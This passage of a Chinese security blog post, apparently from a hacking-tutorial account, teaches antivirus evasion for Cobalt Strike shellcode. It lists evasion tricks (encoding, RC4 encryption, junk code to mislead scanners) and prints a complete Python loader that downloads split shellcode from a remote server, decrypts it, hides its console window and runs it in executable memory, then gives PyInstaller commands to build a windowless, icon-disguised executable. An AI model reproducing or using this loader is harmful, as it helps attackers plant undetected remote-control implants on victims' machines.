data-w="1217" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/2_8ltcKd19PpKH02fvqvx0pFWRf3CmcQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyzdZEVNDqWEcxCnCT46es279x8ltcKd19PpKH02fvqvx0pFWRf3CmcQ/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">4、简要说明：</span></h4><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">这一套环境搭配是我经过不断的实验和个人喜好总结出来的，安装方式不在累述，如果你连这点学习能力都没有话，你还是让Cobaltstrike和Metasploit躺在那儿意淫吧。个人建议：第一：不要使用pip方式安装PyInstaller，至于为什么，你多尝试几次就知道各种兼容环境是有多麻烦了。第二：如果你本机还安装了python3的环境，如果你怕麻烦，你可以单独在虚拟机里面安装这个环境，因为python3和python2共存，你还得倒腾一会儿，里面的坑还有 pip2 pip3得区分开等等。愿意倒腾的推荐下面几篇文章用作参考</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">https://blog.csdn.net/zydz/article/details/78121936https://blog.csdn.net/C_chuxin/article/details/82962797https://blog.csdn.net/qq_34444097/article/details/103027906</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><br  /></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="font-size:16px;line-height:36px;;"><strong><span style="font-size:16px;line-height:36px;;box-sizing: border-box;font family: arial, helvetica, sans-serif;">0x05 免杀原理</span></strong></span></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、：shellcode字符串 不做硬编码（人话：shellcode字符串不写死在代码里面）</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、：shellcode字符串 多种编码方式混淆</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">3、：shellcode字符串 加密</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">4、：添加无危害的代码执行流程扰乱av分析（早些年的花指令免杀思维）</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">5、：CobaltStrike生成的shellcode是一段下载者，主要功能是下载becon.dll，然后加载进内存，很多功能都在bencon里面，所以说cs的shellcode其实不具备多少危险动作的，但是它为什么会被杀毒软件查杀呢，那是因为杀毒软件利用一些算法例如模糊哈希算法（Fuzzy Hashing）提取出来了特征码。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">6：CobaltStrike自身是用的管道进行进程通信。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">根据我fuzz得出的结论：动态行为查杀真的不好过么？答案是否定的：CobaltStrike的管道通信模式加上将花指令免杀思维运用在高级语言层面上一样有效，人话就是在shellcode loader的代码层面加一些正常的代码，让exe本身拥有正常的动作，扰乱av的判断，当然这个的前提是因为我们站在了CobaltStrike的管道通信模式的优势上。静态查杀好过么？答案是：好过，shellcode不落地+CobaltStrike本身的管道通信模式+shellcode字符串各种组合的编码+加密。云查杀的特点约等于特征查杀，好过。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">总结：本文所阐述的粗略且浅显的免杀方法都是站在CobaltStrike强大的肩膀上实现的。</span></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="font-size:16px;line-height:36px;;"><strong><span style="box-sizing: border-box;font family: arial, helvetica, sans-serif;">0x06 show you the code</span></strong></span><br  /><span style="font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></h2><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="python"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">from</span> ctypes <span class="code-snippet__keyword">import</span> *</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> ctypes</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> sys, os, hashlib, time, base64</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> random, string</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> requests</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> time</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 获取随机字符串函数，减少特征</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">def</span> <span class="code-snippet__title">GenPassword</span><span class="code-snippet__params">(length)</span>:</span></span></code><code><span class="code-snippet_outer">    numOfNum = random.randint(<span class="code-snippet__number">1</span>,length<span class="code-snippet__number">-1</span>)</span></code><code><span class="code-snippet_outer">    numOfLetter = length - numOfNum</span></code><code><span class="code-snippet_outer">    slcNum = [random.choice(string.digits) <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> range(numOfNum)]</span></code><code><span class="code-snippet_outer">    slcLetter = [random.choice(string.ascii_letters) <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> range(numOfLetter)]</span></code><code><span class="code-snippet_outer">    slcChar = slcNum + slcLetter</span></code><code><span class="code-snippet_outer">    random.shuffle(slcChar)</span></code><code><span class="code-snippet_outer">    getPwd = <span class="code-snippet__string">''</span>.join([i <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> slcChar])</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">return</span> getPwd</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># rc4加解密函数，public_key（公钥）使用GenPassword函数，减少特征</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">def</span> <span class="code-snippet__title">rc4</span><span class="code-snippet__params">(string, op=<span class="code-snippet__string">'encode'</span>, public_key=GenPassword<span class="code-snippet__params">(<span class="code-snippet__number">7</span>)</span>, expirytime=<span class="code-snippet__number">0</span>)</span>:</span></span></code><code><span class="code-snippet_outer">    ckey_lenth = <span class="code-snippet__number">4</span></span></code><code><span class="code-snippet_outer">    public_key = public_key <span class="code-snippet__keyword">and</span> public_key <span class="code-snippet__keyword">or</span> <span class="code-snippet__string">''</span></span></code><code><span class="code-snippet_outer">    key = hashlib.md5(public_key).hexdigest()</span></code><code><span class="code-snippet_outer">    keya = hashlib.md5(key[<span class="code-snippet__number">0</span>:<span class="code-snippet__number">16</span>]).hexdigest()</span></code><code><span class="code-snippet_outer">    keyb = hashlib.md5(key[<span class="code-snippet__number">16</span>:<span class="code-snippet__number">32</span>]).hexdigest()</span></code><code><span class="code-snippet_outer">    keyc = ckey_lenth <span class="code-snippet__keyword">and</span> (op == <span class="code-snippet__string">'decode'</span> <span class="code-snippet__keyword">and</span> string[<span class="code-snippet__number">0</span>:ckey_lenth] <span class="code-snippet__keyword">or</span> hashlib.md5(str(time.time())).hexdigest()[<span class="code-snippet__number">32</span> - ckey_lenth:<span class="code-snippet__number">32</span>]) <span class="code-snippet__keyword">or</span> <span class="code-snippet__string">''</span></span></code><code><span class="code-snippet_outer">    cryptkey = keya + hashlib.md5(keya + keyc).hexdigest()</span></code><code><span class="code-snippet_outer">    key_lenth = len(cryptkey)  <span class="code-snippet__comment"># 64</span></span></code><code><span class="code-snippet_outer">    string = op == <span class="code-snippet__string">'decode'</span> <span class="code-snippet__keyword">and</span> base64.b64decode(string[<span class="code-snippet__number">4</span>:]) <span class="code-snippet__keyword">or</span> <span class="code-snippet__string">'0000000000'</span> + hashlib.md5(string + keyb).hexdigest()[<span class="code-snippet__number">0</span>:<span class="code-snippet__number">16</span>] + string</span></code><code><span class="code-snippet_outer">    string_lenth = len(string)</span></code><code><span class="code-snippet_outer">    result = <span class="code-snippet__string">''</span></span></code><code><span class="code-snippet_outer">    box = list(range(<span class="code-snippet__number">256</span>))</span></code><code><span class="code-snippet_outer">    randkey = []</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> xrange(<span class="code-snippet__number">255</span>):</span></code><code><span class="code-snippet_outer">        randkey.append(ord(cryptkey[i % key_lenth]))</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> xrange(<span class="code-snippet__number">255</span>):</span></code><code><span class="code-snippet_outer">        j = <span class="code-snippet__number">0</span></span></code><code><span class="code-snippet_outer">        j = (j + box[i] + randkey[i]) % <span class="code-snippet__number">256</span></span></code><code><span class="code-snippet_outer">        tmp = box[i]</span></code><code><span class="code-snippet_outer">        box[i] = box[j]</span></code><code><span class="code-snippet_outer">        box[j] = tmp</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">for</span> i <span class="code-snippet__keyword">in</span> xrange(string_lenth):</span></code><code><span class="code-snippet_outer">        a = j = <span class="code-snippet__number">0</span></span></code><code><span class="code-snippet_outer">        a = (a + <span class="code-snippet__number">1</span>) % <span class="code-snippet__number">256</span></span></code><code><span class="code-snippet_outer">        j = (j + box[a]) % <span class="code-snippet__number">256</span></span></code><code><span class="code-snippet_outer">        tmp = box[a]</span></code><code><span class="code-snippet_outer">        box[a] = box[j]</span></code><code><span class="code-snippet_outer">        box[j] = tmp</span></code><code><span class="code-snippet_outer">        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % <span class="code-snippet__number">256</span>]))</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> op == <span class="code-snippet__string">'decode'</span>:</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (result[<span class="code-snippet__number">0</span>:<span class="code-snippet__number">10</span>] == <span class="code-snippet__string">'0000000000'</span> <span class="code-snippet__keyword">or</span> int(result[<span class="code-snippet__number">0</span>:<span class="code-snippet__number">10</span>]) - int(time.time()) &gt; <span class="code-snippet__number">0</span>) <span class="code-snippet__keyword">and</span> result[<span class="code-snippet__number">10</span>:<span class="code-snippet__number">26</span>] == hashlib.md5(</span></code><code><span class="code-snippet_outer">                result[<span class="code-snippet__number">26</span>:] + keyb).hexdigest()[<span class="code-snippet__number">0</span>:<span class="code-snippet__number">16</span>]:</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__keyword">return</span> result[<span class="code-snippet__number">26</span>:]</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">else</span>:</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">None</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span>:</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">return</span> keyc + base64.b64encode(result)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 以下为shellcode loader代码</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># shellcode字符串经过base64编码再经过hex编码分成三块，存放在某几个服务器上</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># get请求方式得到经过编码的shellcode字符串</span></span></code><code><span class="code-snippet_outer">res1 = requests.get(<span class="code-snippet__string">"http://xxx.xxx.xxx/code/Shellcode1.TXT"</span>)</span></code><code><span class="code-snippet_outer">res2 = requests.get(<span class="code-snippet__string">"http://xxx.xxx.xxx/code/Shellcode2.TXT"</span>)</span></code><code><span class="code-snippet_outer">res3 = requests.get(<span class="code-snippet__string">"http://xxx.xxx.xxx/code/Shellcode3.TXT"</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span></code><code><span class="code-snippet_outer">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span></code><code><span class="code-snippet_outer">whnd = ctypes.windll.kernel32.GetConsoleWindow()</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">rcpw = GenPassword(<span class="code-snippet__number">13</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 得到经过编码后的shellcode字符串后进行rc4加密，私钥通过GenPassword()函数得到</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 以此减少特码，达到内存中不暴露shellcode原始字符串</span></span></code><code><span class="code-snippet_outer">buf = rc4(base64.b64decode(res1.text+res2.text+res3.text).decode(<span class="code-snippet__string">'hex'</span>),<span class="code-snippet__string">'encode'</span>,rcpw)</span></code><code><span class="code-snippet_outer">rc4(res2.text,<span class="code-snippet__string">'encode'</span>,GenPassword(<span class="code-snippet__number">13</span>))<span class="code-snippet__comment"># 干扰代码</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> whnd != <span class="code-snippet__number">0</span>:</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> GenPassword(<span class="code-snippet__number">6</span>) != GenPassword(<span class="code-snippet__number">7</span>):<span class="code-snippet__comment">#干扰代码</span></span></code><code><span class="code-snippet_outer">        ctypes.windll.user32.ShowWindow(whnd, <span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">        ctypes.windll.kernel32.CloseHandle(whnd)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 解密shellcode</span></span></code><code><span class="code-snippet_outer">scode = bytearray(rc4(buf, <span class="code-snippet__string">'decode'</span>, rcpw))</span></code><code><span class="code-snippet_outer">rc4(res2.text+res1.text,<span class="code-snippet__string">'encode'</span>,GenPassword(<span class="code-snippet__number">13</span>))<span class="code-snippet__comment"># 干扰代码</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 申请可读可写不可执行的内存</span></span></code><code><span class="code-snippet_outer">memHscode = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="code-snippet__number">0</span>),</span></code><code><span class="code-snippet_outer">                                                      ctypes.c_int(len(scode)),</span></code><code><span class="code-snippet_outer">                                                      ctypes.c_int(<span class="code-snippet__number">0x3000</span>),</span></code><code><span class="code-snippet_outer">                                                      ctypes.c_int(<span class="code-snippet__number">0x40</span>))</span></code><code><span class="code-snippet_outer">rc4(res1.text,<span class="code-snippet__string">'encode'</span>,GenPassword(<span class="code-snippet__number">13</span>))<span class="code-snippet__comment"># 干扰代码</span></span></code><code><span class="code-snippet_outer">buf = (ctypes.c_char * len(scode)).from_buffer(scode)</span></code><code><span class="code-snippet_outer">old = ctypes.c_long(<span class="code-snippet__number">1</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 使用VirtualProtect将shellcode的内存区块设置为可执行，所谓的渐进式加载模式</span></span></code><code><span class="code-snippet_outer">VirtualProtect(memHscode, ctypes.c_int(len(scode)), <span class="code-snippet__number">0x40</span>, ctypes.byref(old))</span></code><code><span class="code-snippet_outer">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memHscode),</span></code><code><span class="code-snippet_outer">                                     buf,</span></code><code><span class="code-snippet_outer">                                     ctypes.c_int(len(scode)))</span></code><code><span class="code-snippet_outer">fuck=rc4(GenPassword(<span class="code-snippet__number">7</span>),<span class="code-snippet__string">'encode'</span>,GenPassword(<span class="code-snippet__number">13</span>))<span class="code-snippet__comment"># 干扰代码</span></span></code><code><span class="code-snippet_outer">runcode = cast(memHscode, CFUNCTYPE(c_void_p))<span class="code-snippet__comment"># 创建 shellcode 的函数指针</span></span></code><code><span class="code-snippet_outer">fuck=rc4(GenPassword(<span class="code-snippet__number">7</span>),<span class="code-snippet__string">'encode'</span>,GenPassword(<span class="code-snippet__number">13</span>))<span class="code-snippet__comment"># 干扰代码</span></span></code><code><span class="code-snippet_outer">runcode()<span class="code-snippet__comment"># 执行</span></span></code></pre></section><p><br  /></p><p><br  /></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x07 利用PyInstaller编译</span></strong></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、不指定图标的编译方式</span></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">python2</span> <span class="code-snippet__selector-tag">PyInstaller</span><span class="code-snippet__selector-class">.py</span> <span class="code-snippet__selector-tag">--noconsole</span> <span class="code-snippet__selector-tag">--onefile</span> <span class="code-snippet__selector-tag">cs</span>\<span class="code-snippet__selector-tag">cs</span><span class="code-snippet__selector-class">.py</span></span></code></pre></section><p><br  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.8119964189794091" data-s="300,640" data-type="png" data-w="1117" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/3_c6bCVUuicyGRndA0RYLEXia8q7WwnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyybQia2WOWJibdOzYaOgR6pkgqYtmXc6bCVUuicyGRndA0RYLEXia8q7WwnA/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.7283950617283951" data-s="300,640" data-type="png" data-w="648" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/4_vdZLvMcfvdpnGtr9my8qceqeg5PHsw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyqCkic5yR7ntrHb04wfYviaviaEMvdZLvMcfvdpnGtr9my8qceqeg5PHsw/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、指定图标的编译方式</span></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">python2</span> <span class="code-snippet__selector-tag">PyInstaller</span><span class="code-snippet__selector-class">.py</span> <span class="code-snippet__selector-tag">--noconsole</span> <span class="code-snippet__selector-tag">--icon</span> <span class="code-snippet__selector-tag">cs</span>\<span class="code-snippet__selector-tag">icon</span><span class="code-snippet__selector-class">.ico</span> <span class="code-snippet__selector-tag">--onefile</span> <span class="code-snippet__selector-tag">cs</span>\<span class="code-snippet__selector-tag">cs</span><span class="code-snippet__selector-class">.py</span></span></code></pre></section><p><br  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;padding-right: 0.1px;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.928007889546351" data-s="300,640" data-type="png" data-w="1014" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/5_B97wvXuGY0Jcfy7URKiaMR13vqH66g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyy840k1309AFXeb3tttQefK8af7B97wvXuGY0Jcfy7URKiaMR13vqH66g/640?wx_fmt=png'" style=""  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.7449139280125195" data-s="300,640" data-type="png" data-w="639" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/6_NZUZIrAjYMhxpFTpHf3BaSEoMzCAWw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyy7eaWricIKcbwNjDxkoPITIURdNZUZIrAjYMhxpFTpHf3BaSEoMzCAWw/640?wx_fmt=png'" style=""  /></p><p style="text-align: center;"><br  /></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid 